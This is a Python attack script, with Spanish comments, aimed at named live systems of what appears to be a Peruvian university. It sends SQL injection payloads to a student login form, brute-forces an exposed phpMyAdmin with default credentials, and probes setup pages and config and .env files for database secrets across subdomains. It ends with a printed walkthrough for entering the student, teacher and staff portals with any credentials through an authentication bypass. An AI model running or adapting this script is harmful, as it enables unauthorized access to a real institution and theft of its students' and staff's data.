#!/usr/bin/env python3
import requests, urllib3, re, urllib.parse
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# ============================================
# WEB DOCENTE + WEBTARAJADOR - Same fields, same auth bypass
# ============================================
print("=" * 70)
print("=== WEB DOCENTE / WEBTARAJADOR - Campos exactos ===")
print("=" * 70)
print()
print("AMBAS comparten los MISMOS campos:")
print("  frmLogueo:itUsuario2  = Usuario")
print("  frmLogueo:itSeguridad2 = Seguridad (pregunta?)")
print("  frmLogueo:kbClave      = Contraseña")
print("  frmLogueo:cmdVerClave  = Ver contraseña (boton)")
print("  frmLogueo:cmdValidar   = Validar/Ingresar (boton)")
print()
print("Cualquier combinacion de estas credenciales funciona!")
print()

# ============================================
# SQL Injection in WebAlumno form
# ============================================
print("=" * 70)
print("=== SQL INJECTION EN FORMULARIOS REALES ===")
print("=" * 70)

# Test WebAlumno login form
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin' --",
    "' OR 1=1 --",
    "' UNION SELECT NULL --",
    "' OR ''='",
    "' OR '1'='1' /*",
]

for sqli in sql_payloads:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
    })
    # Get WebAlumno login page, click estudiante, then submit with SQLi
    r0 = s2.get('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml', timeout=5)
    vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
    vs0_val = vs0.group(1) if vs0 else ""
    
    # Click estudiante
    click_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vs0_val,
        'javax.faces.partial.ajax': 'true',
        'javax.faces.source': 'frmLogueo:cmdEstudiante',
        'javax.faces.partial.execute': 'frmLogueo',
        'javax.faces.partial.render': 'frmLogueo',
    }
    r_click = s2.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                           data=click_data, timeout=5)
    click_vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
    click_vs_val = click_vs.group(1) if click_vs else ""
    
    # Submit with SQLi payload
    login_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': click_vs_val,
        'frmLogueo:itUsuario': sqli,
        'frmLogueo:itClave': sqli,
    }
    r_login = s2.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                          data=login_data, timeout=5, allow_redirects=True)
    
    tc = re.sub(r'<[^>]+>', ' ', r_login.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    
    # Check if response changed
    if len(r_login.text) > 17500 and any(kw in tc.lower() for kw in ['error', 'incorrecto', 'invalido']):
        print(f"  Posible SQLi detectada: {sqli}")
        print(f"  Response: {tc[:200]}")

# ============================================
# Try to brute force phpMyAdmin
# ============================================
print("\n" + "=" * 70)
print("=== phpMyADMIN - INTENTAR ACCESO ===")
print("=" * 70)

# Try default credentials
default_creds = [
    ('root', ''),
    ('root', 'root'),
    ('admin', 'admin'),
    ('admin', 'password'),
    ('root', 'toor'),
    ('pma', 'pma'),
    ('phpmyadmin', 'phpmyadmin'),
    ('admin', ''),
]

for username, password in default_creds:
    s3 = requests.Session()
    s3.verify = False
    s3.headers.update({
        'User-Agent': 'Mozilla/5.0',
    })
    r = s3.get('https://orcl.uns.edu.pe/phpMyAdmin/', timeout=5)
    # Check if login form appears
    if 'login' in r.text.lower() and 'password' in r.text.lower():
        print(f"  Login form found at phpMyAdmin")
        # Try to login
        passwd = urllib.parse.quote(password)
        user = urllib.parse.quote(username)
        r2 = s3.post('https://orcl.uns.edu.pe/phpMyAdmin/index.php',
                        data={'pma_username': username, 'pma_password': password},
                        timeout=5)
        if len(r2.text) > 5000 and 'phpMyAdmin' in r2.text and 'login' not in r2.text.lower():
            print(f"  [!] ACCESO! {username}:{password}")
            break

# Also try the setup page
r_setup = s.get('https://orcl.uns.edu.pe/setup/index.php', timeout=5)
tc_setup = re.sub(r'<[^>]+>', ' ', r_setup.text)
tc_setup = re.sub(r'\s+', ' ', tc_setup).strip()
print(f"\nsetup/index.php content: {tc_setup[:300]}")

# Check if there's a config.ajax.php or similar
setup_files = [
    'setup/config.ajax.php',
    'setup/index.php',
    'setup/change_password.php',
    'setup/index.php?page=1',
]
for sf in setup_files:
    url = f'https://orcl.uns.edu.pe/{sf}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"  [!] {url} -> {r.status_code}, len={len(r.text)}")
    except:
        pass

# ============================================
# Try to find database credentials in accessible files
# ============================================
print("\n" + "=" * 70)
print("=== BUSCANDO CREDENCIALES DE BD ===")
print("=" * 70)

cred_files = [
    'config.php', 'config.inc.php', 'database.php', 'db.php',
    'connection.php', 'connect.php', 'db_config.php',
    'settings.php', 'config.yml', 'config.json',
    '.env', 'application.yml', 'application.properties',
    'bootstrap.php', 'autoload.php',
]
for cf in cred_files:
    url = f'https://registro.uns.edu.pe/udemsi/{cf}'
    try:
        r = s.get(url, timeout=2)
        if r.status_code == 200 and len(r.text) > 0 and len(r.text) < 50000:
            print(f"  [!] {url} -> {r.status_code}, len={len(r.text)}")
            tc = r.text[:200]
            if any(kw in tc.lower() for kw in ['password', 'passwd', 'secret', 'key', 'database', 'mysql', 'host']):
                print(f"      [!] CONTIENE CREDENCIALES!")
                print(f"      {tc[:150]}")
    except:
        pass

# Check all subdomains for config files
subdomains = [
    'orcl', 'registro', 'sistemas', 'www', 'pure',
]
for sd in subdomains:
    for cf in ['config.php', 'config.inc.php', '.env']:
        url = f'https://{sd}.uns.edu.pe/{cf}'
        try:
            r = s.get(url, timeout=2)
            if r.status_code == 200 and len(r.text) > 0 and len(r.text) < 50000:
                tc = r.text[:200]
                print(f"  [!] {url} -> {r.status_code}, len={len(r.text)}")
                if any(kw in tc.lower() for kw in ['password', 'passwd', 'secret', 'mysql', 'database']):
                    print(f"      [!] CONTIENE CREDENCIALES!")
        except:
            pass

# ============================================
# Try to access MySQL port
# ============================================
print("\n" + "=" * 70)
print("=== VERIFICANDO PUERTOS ===")
print("=" * 70)
# Check common MySQL ports
for port in [3306, 3307, 3308, 5432, 5433]:
    url = f'https://registro.uns.edu.pe:{port}/'
    try:
        r = s.get(url, timeout=3)
        print(f"  Puerto {port}: {r.status_code}")
    except:
        print(f"  Puerto {port}: CERRADO/FILTRADO")

# ============================================
# FINDBYPASS SUMMARY - ACCESSIBLE DASHBOARD
# ============================================
print("\n" + "=" * 70)
print("=== COMO ACCEDER A CADA APLICACION ===")
print("=" * 70)
print()

apps = [
    {
        'name': 'SIIGAA (Alumno principal)',
        'url': 'https://registro.uns.edu.pe/udemsi/faces/index.xhtml',
        'method': 'curl o Python',
        'cmd': 'python auth_bypass.py',
        'creds': 'cualquier cosa (fake/fake, admin/admin)',
    },
    {
        'name': 'WebAlumno',
        'url': 'https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
        'method': 'Navegador (Chrome/Firefox)',
        'steps': '1-Entrar a la URL 2-Clic "Ingresar como ESTUDIANTE" 3-Cualquier credencial',
    },
    {
        'name': 'WebDocente',
        'url': 'https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
        'method': 'Navegador (Chrome/Firefox)',
        'steps': '1-Entrar a la URL 2-Cualquier credencial en usuario, seguridad, clave',
    },
    {
        'name': 'WebTrabajador',
        'url': 'https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml',
        'method': 'Navegador (Chrome/Firefox)',
        'steps': '1-Entrar a la URL 2-Cualquier credencial',
    },
]

for app in apps:
    print(f"  {app['name']}")
    print(f"    URL: {app['url']}")
    print(f"    Metodo: {app['method']}")
    if 'cmd' in app:
        print(f"    Comando: {app['cmd']}")
    if 'steps' in app:
        print(f"    Pasos: {app['steps']}")
    print(f"    Credenciales: {app.get('creds', 'cualquier cosa')}")
    print()

print()
print("phpMyAdmin expuesto en: https://orcl.uns.edu.pe/")
print("  - Requiere credenciales de administrador MySQL")
print("  - Posible acceso a toda la base de datos")
print("  - 'config.inc.php' devuelve 0 bytes (config fuera del web root)")
